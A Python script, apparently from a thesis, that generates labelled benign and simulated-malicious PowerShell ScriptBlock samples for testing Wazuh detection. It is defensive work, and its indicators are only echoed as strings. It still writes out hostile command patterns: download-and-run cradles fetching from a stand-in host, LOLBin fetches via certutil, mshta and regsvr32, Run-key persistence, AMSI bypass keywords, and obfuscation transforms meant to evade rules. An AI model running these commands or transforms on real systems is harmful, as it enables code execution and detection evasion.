#!/usr/bin/env python3
"""Generate a thesis-safe PowerShell ScriptBlock sample set.

The generated samples are meant for defensive Wazuh/ScriptBlock logging tests.
Simulated malicious entries are inert: they only emit strings, decode benign
placeholders, or construct indicators without performing malicious behavior.
"""

from __future__ import annotations

import base64
import csv
import json
from dataclasses import asdict, dataclass
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
DATA_DIR = ROOT / "data"


SOURCES = {
    "MITRE ATT&CK T1059.001": "https://attack.mitre.org/techniques/T1059/001/",
    "Atomic Red Team T1059.001": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md",
    "Wazuh PowerShell guidance": "https://wazuh.com/blog/detecting-powershell-exploitation-techniques-in-windows-using-wazuh/",
    "SigmaHQ PowerShell rules": "https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell",
    "Elastic detection rules": "https://github.com/elastic/detection-rules/tree/main/rules/windows",
    "Microsoft Sentinel detections": "https://github.com/Azure/Azure-Sentinel/tree/master/Detections",
    "LOLBAS": "https://lolbas-project.github.io/",
    "Invoke-Obfuscation": "https://github.com/danielbohannon/Invoke-Obfuscation",
    "Local benign admin": "local thesis-generated benign administration samples",
}


@dataclass(frozen=True)
class Sample:
    id: str
    label: str
    class_id: int
    source_family: str
    source_reference_url: str
    tactic: str
    technique: str
    scenario: str
    obfuscation_type: str
    execution_behavior: str
    safety_class: str
    scriptblock: str
    expected_signal: str
    safety_notes: str


def ps_single_quote(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def safe_emit(sample_id: str, text: str) -> str:
    return (
        f"$sampleId = {ps_single_quote(sample_id)}; "
        f"$indicator = {ps_single_quote(text)}; "
        'Write-Output ("WAZUH_SAMPLE {0} {1}" -f $sampleId, $indicator)'
    )


def mixed_case(value: str) -> str:
    chars = []
    upper = True
    for ch in value:
        if ch.isalpha():
            chars.append(ch.upper() if upper else ch.lower())
            upper = not upper
        else:
            chars.append(ch)
    return "".join(chars)


def backtick_text(value: str) -> str:
    replacements = {
        "Invoke": "In`voke",
        "Expression": "Ex`pression",
        "Download": "Down`load",
        "String": "Str`ing",
        "Encoded": "En`coded",
        "Command": "Com`mand",
        "WebClient": "Web`Client",
        "FromBase64String": "From`Base64`String",
        "PowerShell": "Power`Shell",
        "powershell": "power`shell",
    }
    result = value
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result


def concat_script(sample_id: str, value: str) -> str:
    chunk_size = max(4, len(value) // 6)
    chunks = [value[i : i + chunk_size] for i in range(0, len(value), chunk_size)]
    parts = ", ".join(ps_single_quote(chunk) for chunk in chunks)
    return (
        f"$sampleId = {ps_single_quote(sample_id)}; "
        f"$parts = @({parts}); "
        "$indicator = ($parts -join ''); "
        'Write-Output ("WAZUH_SAMPLE {0} {1}" -f $sampleId, $indicator)'
    )


def base64_script(sample_id: str, value: str) -> str:
    encoded = base64.b64encode(value.encode("utf-16le")).decode("ascii")
    return (
        f"$sampleId = {ps_single_quote(sample_id)}; "
        f"$encoded = {ps_single_quote(encoded)}; "
        "$indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); "
        'Write-Output ("WAZUH_SAMPLE {0} {1}" -f $sampleId, $indicator)'
    )


def benign_templates() -> list[tuple[str, str]]:
    base = [
        ("admin_process_inventory", "Get-Process | Select-Object -First 5 Name,Id,CPU"),
        ("admin_service_inventory", "Get-Service | Select-Object -First 8 Name,Status"),
        ("admin_os_inventory", "Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version"),
        ("admin_bios_inventory", "Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SerialNumber"),
        ("admin_disk_inventory", "Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID,FreeSpace,Size"),
        ("admin_network_inventory", "Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias,IPv4Address"),
        ("admin_adapter_inventory", "Get-NetAdapter | Select-Object -First 5 Name,Status,MacAddress"),
        ("admin_eventlog_check", "Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id,ProviderName"),
        ("admin_temp_listing", "Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name"),
        ("admin_path_check", "Test-Path -Path $env:TEMP"),
        ("admin_date_check", "Get-Date | Select-Object DateTime"),
        ("admin_env_summary", "Get-ChildItem Env: | Select-Object -First 6 Name,Value"),
        ("admin_localuser_inventory", "Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name,Enabled"),
        ("admin_localgroup_inventory", "Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name"),
        ("admin_firewall_profile_read", "Get-NetFirewallProfile | Select-Object Name,Enabled"),
        ("admin_module_list", "Get-Module -ListAvailable | Select-Object -First 5 Name,Version"),
        ("admin_command_lookup", "Get-Command Get-Process | Select-Object Name,CommandType"),
        ("admin_json_formatting", "@{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json"),
        ("admin_csv_formatting", "Get-Process | Select-Object -First 3 Name,Id | ConvertTo-Csv -NoTypeInformation"),
        ("admin_string_measure", "'routine maintenance script' | Measure-Object -Character"),
        ("admin_hash_string", "Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign')))")
    ]

    dual_use_benign = [
        ("benign_encoded_config_decode", "$b='YgBlAG4AaQBnAG4AIABjAG8AbgBmAGkAZwA='; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b))"),
        ("benign_web_uri_string_only", "$uri='https://intranet.example.local/status'; Write-Output $uri"),
        ("benign_long_admin_string", "$note='administrative inventory ' * 20; Write-Output $note"),
        ("benign_special_chars_config", "$cfg='path=C:\\Temp;mode=audit;owner=admin;enabled=true'; Write-Output $cfg"),
        ("benign_concat_report_name", "$name=('weekly' + '-' + 'inventory' + '-' + 'report'); Write-Output $name"),
    ]

    templates = base + dual_use_benign
    out: list[tuple[str, str]] = []
    for i in range(4):
        for name, command in templates:
            suffix = f"v{i + 1}"
            wrapped = (
                f"$sampleId = 'BEN-{len(out) + 1:03d}'; "
                f"$scenario = '{name}_{suffix}'; "
                f"{command}; "
                'Write-Output ("WAZUH_SAMPLE {0} {1}" -f $sampleId, $scenario)'
            )
            out.append((name, wrapped))
            if len(out) == 100:
                return out
    return out[:100]


MALICIOUS_INDICATORS = [
    ("encoded_command_flag", "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64_PLACEHOLDER>", "Defense Evasion", "T1059.001"),
    ("execution_policy_bypass_flag", "powershell.exe -NoProfile -ExecutionPolicy Bypass -File <placeholder.ps1>", "Defense Evasion", "T1059.001"),
    ("downloadstring_cradle", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.local/payload.ps1')", "Execution", "T1059.001"),
    ("invoke_webrequest_cradle", "IEX (Invoke-WebRequest -UseBasicParsing 'http://example.local/stage.ps1').Content", "Execution", "T1059.001"),
    ("webclient_object", "New-Object System.Net.WebClient | ForEach-Object { $_.DownloadString('http://example.local/stage') }", "Command and Control", "T1059.001"),
    ("frombase64_decode", "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<BASE64_PLACEHOLDER>'))", "Defense Evasion", "T1059.001"),
    ("hidden_window_marker", "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '<placeholder>'", "Defense Evasion", "T1059.001"),
    ("nop_w_hidden_marker", "powershell -nop -w hidden -c '<placeholder command>'", "Defense Evasion", "T1059.001"),
    ("downgrade_marker", "powershell.exe -Version 2 -NoProfile -Command '<placeholder>'", "Defense Evasion", "T1059.001"),
    ("bits_transfer_marker", "Start-BitsTransfer -Source 'http://example.local/file' -Destination '$env:TEMP\\file'", "Command and Control", "T1105"),
    ("reflection_load_marker", "[Reflection.Assembly]::Load(<BYTE_ARRAY_PLACEHOLDER>)", "Defense Evasion", "T1059.001"),
    ("add_type_marker", "Add-Type -TypeDefinition '<CSharp placeholder>'", "Execution", "T1059.001"),
    ("scriptblock_remote_marker", "Invoke-Command -ComputerName '<host>' -ScriptBlock { <placeholder> }", "Lateral Movement", "T1059.001"),
    ("pssession_marker", "Enter-PSSession -ComputerName '<host>'", "Lateral Movement", "T1059.001"),
    ("scheduled_task_string", "New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile <placeholder>'", "Persistence", "T1053"),
    ("registry_run_string", "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '<placeholder>'", "Persistence", "T1547"),
    ("amsi_keyword_placeholder", "AmsiUtils and amsiInitFailed placeholder string for detection testing only", "Defense Evasion", "T1562"),
    ("compress_archive_collection", "Compress-Archive -Path '$env:USERPROFILE\\Documents\\*.txt' -DestinationPath '$env:TEMP\\archive.zip'", "Collection", "T1560"),
    ("process_create_marker", "wmic process call create 'powershell -NoProfile -WindowStyle Hidden <placeholder>'", "Execution", "T1047"),
    ("certutil_lolbin_marker", "certutil.exe -urlcache -split -f http://example.local/file.txt file.txt", "Command and Control", "LOLBAS"),
    ("mshta_lolbin_marker", "mshta.exe http://example.local/test.hta", "Execution", "LOLBAS"),
    ("regsvr32_lolbin_marker", "regsvr32.exe /s /n /u /i:http://example.local/scrobj.sct scrobj.dll", "Execution", "LOLBAS"),
    ("rundll32_lolbin_marker", "rundll32.exe javascript:'<placeholder>'", "Execution", "LOLBAS"),
    ("installutil_lolbin_marker", "InstallUtil.exe <placeholder assembly path>", "Defense Evasion", "LOLBAS"),
    ("msbuild_lolbin_marker", "MSBuild.exe <placeholder project file>", "Defense Evasion", "LOLBAS"),
    ("powershell_profile_marker", "$PROFILE CurrentUserAllHosts startup script placeholder", "Persistence", "T1546"),
    ("invoke_expression_alias", "iex '<placeholder expression>'", "Execution", "T1059.001"),
    ("invoke_webrequest_alias", "iwr 'http://example.local/test' -UseBasicParsing", "Command and Control", "T1059.001"),
    ("curl_alias_marker", "curl 'http://example.local/test.ps1' | iex", "Execution", "T1059.001"),
    ("encoded_blob_marker", "SQBFAFgAIAAoAGcAYwBtACAAJwAqACcAKQA= PowerShell-like encoded placeholder", "Defense Evasion", "T1059.001"),
    ("environment_recon_chain", "whoami; hostname; ipconfig /all; net user", "Discovery", "T1087"),
    ("process_recon_chain", "Get-Process; Get-Service; Get-NetTCPConnection", "Discovery", "T1057"),
    ("file_recon_chain", "Get-ChildItem -Recurse -Path $env:USERPROFILE -Include *.txt,*.docx", "Discovery", "T1083"),
    ("clipboard_marker", "Get-Clipboard | Out-String", "Collection", "T1115"),
    ("screen_capture_marker", "Add-Type -AssemblyName System.Windows.Forms; <screen capture placeholder>", "Collection", "T1113"),
    ("dns_txt_marker", "Resolve-DnsName -Type TXT example.local", "Command and Control", "T1071"),
    ("proxy_marker", "[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials", "Command and Control", "T1090"),
    ("dynamic_command_reconstruction", "$cmd = 'Inv' + 'oke-Expression'; <placeholder only>", "Defense Evasion", "T1027"),
    ("unicode_escape_marker", "'\\u0069\\u0065\\u0078' PowerShell unicode escape placeholder", "Defense Evasion", "T1027"),
    ("high_entropy_marker", "High entropy placeholder: QWxhZGRpbjpPcGVuU2VzYW1lMTIzNDU2Nzg5LytBQkNERUZHSEk=", "Defense Evasion", "T1027"),
]


def source_for_indicator(index: int, scenario: str) -> str:
    if "lolbin" in scenario:
        return "LOLBAS"
    if index % 6 == 0:
        return "Atomic Red Team T1059.001"
    if index % 6 == 1:
        return "MITRE ATT&CK T1059.001"
    if index % 6 == 2:
        return "Wazuh PowerShell guidance"
    if index % 6 == 3:
        return "SigmaHQ PowerShell rules"
    if index % 6 == 4:
        return "Elastic detection rules"
    return "Microsoft Sentinel detections"


def build_samples() -> list[Sample]:
    samples: list[Sample] = []

    for index, (scenario, scriptblock) in enumerate(benign_templates(), start=1):
        samples.append(
            Sample(
                id=f"BEN-{index:03d}",
                label="benign",
                class_id=0,
                source_family="Local benign admin",
                source_reference_url=SOURCES["Local benign admin"],
                tactic="Benign Administration",
                technique="Benign PowerShell",
                scenario=scenario,
                obfuscation_type="none",
                execution_behavior="execute_safe",
                safety_class="benign_safe_execution",
                scriptblock=scriptblock,
                expected_signal="should_not_alert_unless_rule_is_broad",
                safety_notes="Benign administrative or formatting command.",
            )
        )

    for index, (scenario, indicator, tactic, technique) in enumerate(MALICIOUS_INDICATORS, start=1):
        source_family = source_for_indicator(index, scenario)
        sample_id = f"SIM-{index:03d}"
        samples.append(
            Sample(
                id=sample_id,
                label="simulated_malicious",
                class_id=1,
                source_family=source_family,
                source_reference_url=SOURCES[source_family],
                tactic=tactic,
                technique=technique,
                scenario=scenario,
                obfuscation_type="none",
                execution_behavior="emit_indicator_string_only",
                safety_class="inert_string_telemetry",
                scriptblock=safe_emit(sample_id, indicator),
                expected_signal="rule_or_scriptblock_keyword_match_possible",
                safety_notes="Indicator is emitted as text only; no external connection or harmful action is performed.",
            )
        )

    obfuscators = [
        ("string_concatenation", concat_script, "Invoke-Obfuscation"),
        ("mixed_case", lambda sid, text: safe_emit(sid, mixed_case(text)), "Invoke-Obfuscation"),
        ("base64_literal_decode_safe", base64_script, "Invoke-Obfuscation"),
        ("backtick_literal", lambda sid, text: safe_emit(sid, backtick_text(text)), "Invoke-Obfuscation"),
    ]

    obf_index = 1
    for base_index, (scenario, indicator, tactic, technique) in enumerate(MALICIOUS_INDICATORS, start=1):
        for obfuscation_type, transform, source_family in obfuscators:
            sample_id = f"OBF-{obf_index:03d}"
            samples.append(
                Sample(
                    id=sample_id,
                    label="simulated_malicious",
                    class_id=1,
                    source_family=source_family,
                    source_reference_url=SOURCES[source_family],
                    tactic=tactic,
                    technique=technique,
                    scenario=f"{scenario}_{obfuscation_type}",
                    obfuscation_type=obfuscation_type,
                    execution_behavior="safe_obfuscated_indicator",
                    safety_class="safe_decode_only" if obfuscation_type == "base64_literal_decode_safe" else "inert_string_telemetry",
                    scriptblock=transform(sample_id, indicator),
                    expected_signal="obfuscation_may_reduce_rule_match_or_trigger_lexical_features",
                    safety_notes="Obfuscated indicator is safe; it is not executed as a real command.",
                )
            )
            obf_index += 1

    if len(samples) != 300:
        raise RuntimeError(f"Expected 300 samples, got {len(samples)}")

    return samples


def write_outputs(samples: list[Sample]) -> None:
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    csv_path = DATA_DIR / "powershell_scriptblock_samples.csv"
    json_path = DATA_DIR / "powershell_scriptblock_samples.json"

    rows = [asdict(sample) for sample in samples]
    with csv_path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0].keys()))
        writer.writeheader()
        writer.writerows(rows)

    with json_path.open("w", encoding="utf-8") as handle:
        json.dump(rows, handle, ensure_ascii=False, indent=2)


def main() -> None:
    samples = build_samples()
    write_outputs(samples)
    counts = {
        "total": len(samples),
        "benign": sum(1 for sample in samples if sample.label == "benign"),
        "simulated_malicious": sum(1 for sample in samples if sample.label == "simulated_malicious"),
        "obfuscated": sum(1 for sample in samples if sample.obfuscation_type != "none"),
    }
    print(json.dumps(counts, indent=2))


if __name__ == "__main__":
    main()
